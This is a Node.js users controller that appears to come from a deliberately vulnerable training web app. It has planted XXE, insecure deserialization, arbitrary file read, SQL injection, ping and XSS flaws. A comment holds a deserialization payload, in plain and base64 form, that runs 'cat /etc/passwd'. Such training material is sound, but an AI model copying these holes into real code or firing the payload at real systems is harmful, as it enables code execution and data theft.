var UsersModel = require("../model/userModel");
const { parseXML, getDeserializeData } = require("../utils/utility");

class UsersController {
    constructor() {
        this.usersModel = new UsersModel();
    }

    register(parameter) {
        return new Promise((resolve, reject) => {
            // console.log("Inside Controller");
            this.usersModel.register(parameter)
                .then((result) => {
                    return resolve(result);
                })
                .catch((err) => {
                    return reject(err);
                });
        });
    }


    authenticateUser(credentials) {
        return new Promise((resolve, reject) => {
            // console.log('CON');
            this.usersModel.authenticateUser([credentials.email, credentials.password])
                .then((result) => {
                    return resolve(result[0]);
                })
                .catch((err) => {
                    return reject(err);
                });
        });
    }


    login(creds) {
        return new Promise((resolve, reject) => {
            this.usersModel.login(creds)
                .then((resp) => {
                    console.log('Inside Controller');
                    console.log(resp);
                    return resolve(resp);
                })
                .catch((err) => {
                    return reject(err);
                });

        });

    }
    findUserById(parameter) {
        return new Promise((resolve, reject) => {
            this.usersModel.findUserById([parameter])
                .then((result) => {
                    return resolve(result[0])
                }).catch((err) => {
                    return reject(err);
                });
        });
    }


    ping(ip) {
        return new Promise((resolve, reject) => {
            this.usersModel.ping(ip)
                .then((resp) => {

                    const htmlResponse = resp;

                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    console.log(err);

                    const htmlResponse = resp;
                    return reject(htmlResponse);
                });
        });
    }

    file_read(filename) {
        return new Promise((resolve, reject) => {
            this.usersModel.arb_file_read(filename)
                .then((resp) => {
                    resp = "<p>" + resp + "</p>";
                    return resolve(resp);
                })
                .catch((err) => {
                    console.log(err);
                    err = "<p>" + err + "</p>";
                    return reject(err);
                });
        });
    }

    regex(data) {
        return new Promise((resolve, reject) => {
            this.usersModel.regex(data)
                .then((result) => {
                    return resolve(result);
                })
                .catch((err) => { return reject(err); });
        });
    }
    xxe(username) {
        return new Promise((resolve, reject) => {
            parseXML(username).then((xmlDoc) => {
                username = xmlDoc.get('/user').text();
                this.usersModel.searchUser([username])
                    .then((user) => {
                        let htmlResponse = "";
                        if (user != undefined && user != "") {
                            htmlResponse = "<p>" + username + " present</p>";
                        } else {
                            htmlResponse = "<p>User " + username + " not present";
                        }

                        return resolve(htmlResponse);
                    })
                    .catch((err) => {
                        console.log("C IN")
                        return reject(err);
                    });
            }).catch((err) => {
                console.log('c OUT');
                return reject(err);
            });
        });
    }

    deserialize(cookies) {
        // Payload: base64 of {"fullname":"_$$ND_FUNC$$_function (){ return require('child_process').execSync('cat /etc/passwd').toString(); }()"}
        //  Actual payload: eyJmdWxsbmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmV0dXJuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjU3luYygnY2F0IC9ldGMvcGFzc3dkJykudG9TdHJpbmcoKTsgfSgpIn0=
        return new Promise((resolve, reject) => {
            getDeserializeData(cookies.user)
                .then((fullname) => {
                    resolve("<h2>Hi,<b>" + fullname + "<b><h2><br>");
                }).catch((err) => {
                    return reject("<h2>Hi,<b>" + err + "<b><h2><br>");
                })
        });

    }
    change_password(creds) {
        return new Promise((resolve, reject) => {
            this.usersModel.changePassword(creds)
                .then(() => {
                    const htmlResponse = "<p>Password Changed";
                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    const htmlResponse = "OOPS!!TRY AGAIN";
                    return resolve(htmlResponse);
                });
        })
    }
    second_order_sqli_register(user) {
        return new Promise((resolve, reject) => {
            this.usersModel.second_order_sqli_register(user)
                .then(() => {
                    resolve();
                })
                .catch((err) => {
                    reject(err);
                });
        });
    }
    searchByName(username) {
        return new Promise((resolve, reject) => {
            this.usersModel.searchByName([username])
                .then((user) => {

                    let htmlResponse = "";
                    if (user != undefined && user != "") {
                        htmlResponse = generateSearchUserResponse(user)
                        // htmlResponse = user;
                    } else {
                        htmlResponse = "<p>User " + username + " not present";
                    }

                    return resolve(htmlResponse);
                })
                .catch((err) => {
                    return reject(err);
                });
        });
    }

    contactus(params) {
        return new Promise((resolve, reject) => {
            // console.log("Inside Controller");
            this.usersModel.contactus(params)
                .then(() => {
                    res = "ok"
                    return resolve(res);
                })
                .catch((err) => {
                    return reject(err);
                });
        });
    }
    view_contactus() {
        return new Promise((resolve, reject) => {
            this.usersModel.view_contactus()
                .then((result) => {
                    var htmlResponse = generateContactusResponse(result);
                    return resolve(htmlResponse);
                }).catch((err) => {
                    return reject(err);
                });
        });
    }
}

module.exports = UsersController;


function generateContactusResponse(result) {
    var resString = "<table border='1'>";
    resString += "<tr><th>Message</th>";
    resString += "<th>result Id</th>";
    resString += "</tr>";

    for (i = 0; i < result.length; i++) {
        resString += "<tr> ";
        resString += "<td>" + (result[i].message) + "</td> ";
        resString += "<td>" + result[i].id + "</td> ";
        resString += "</tr> ";
    }
    resString += "</table>";

    return resString;
}




function generateSearchUserResponse(user) {
    var resString = "<table border='1'>";
    resString += "<tr><th>User Id</th>";
    resString += "<th>Full Name</th>";
    resString += "<th>User Name</th>";
    resString += "<th>Email</th>";
    resString += "<th>Phone</th>";
    resString += "</tr>";

    for (i = 0; i < user.length; i++) {
        resString += "<tr> ";
        resString += "<td>" + user[i].id + "</td> ";
        resString += "<td>" + (user[i].fullname) + "</td> ";
        resString += "<td>" + (user[i].username) + "</td> ";
        resString += "<td>" + (user[i].email) + "</td> ";
        resString += "<td>" + (user[i].phone) + "</td> ";


        resString += "</tr> ";
    }
    resString += "</table>";

    return resString;
}
